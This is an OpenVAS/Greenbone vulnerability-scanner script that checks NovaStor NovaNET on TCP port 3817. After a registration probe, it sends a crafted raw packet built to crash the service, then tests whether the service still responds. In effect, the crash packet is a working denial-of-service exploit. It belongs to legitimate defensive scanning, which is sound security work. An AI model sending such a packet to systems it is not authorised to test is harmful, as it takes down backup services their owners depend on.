# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100612");
  script_version("2025-01-17T15:39:18+0000");
  script_tag(name:"last_modification", value:"2025-01-17 15:39:18 +0000 (Fri, 17 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-04-28 14:05:27 +0200 (Wed, 28 Apr 2010)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("NovaStor NovaNET Multiple Code Execution, Denial of Service, Information Disclosure Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39693");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl");
  script_require_ports(3817);

  script_tag(name:"summary", value:"NovaStor NovaNET is prone to code-execution, denial-of-service, and
  information disclosure vulnerabilities.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to execute arbitrary code, access
  sensitive information, or crash the affected application, denying service to legitimate users. Successful
  attacks may result in the complete compromise of an affected computer.");

  script_tag(name:"affected", value:"NovaNET 11 and 12 are vulnerable to all of these issue. NovaBACKUP
  Network 13 is affected by a denial-of-service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("byte_func.inc");
include("misc_func.inc");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

port = 3817;
if(!get_tcp_port_state(port))exit(0);
vt_strings = get_vt_strings();

function service_alive(soc) {

  ip = this_host();
  ip = split(ip, sep:'.', keep:FALSE);
  ip = raw_string(int(ip[0])) + raw_string(int(ip[1])) + raw_string(int(ip[2])) + raw_string(int(ip[3]));

  req = mkdword(0x8454) +  mkdword(0) +  mkdword(6) +  mkdword(0x92) +  mkdword(0) + mkdword(0) +
        mkdword(rand()) +  mkdword(0) +  mkdword(1) +  ip + crap(data:raw_string(0x00), length:28) +
        mkdword(1) + mkdword(port) +  crap(data:raw_string(0x00), length:8) +
        vt_strings["default"] + crap(data:raw_string(0x00), length:24) +
        "Sup: Registration" +  crap(data:raw_string(0x00), length:17);

  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1024);

  if(strlen(buf) > 16 && getdword(blob:buf, pos:0) == 0x8453 && "Sup: Registration" >< buf)
    return TRUE;
  else
    return FALSE;
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

if(!service_alive(soc:soc)) {
  close(soc);
  exit(0);
}

close(soc);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

smash = raw_string(
0x54,0x84,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x92,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,
0x51,0x84,0x00,0x00,0x00,0x00,0x00,0x30,0x05,0x00,0x00,0x00,0xa2,0xb1,0x22,0x32,
0x00,0x00,0x00,0x00);

send(socket:soc, data:smash);
if(!service_alive(soc:soc)) {
  security_message(port:port);
  exit(0);
}

exit(0);
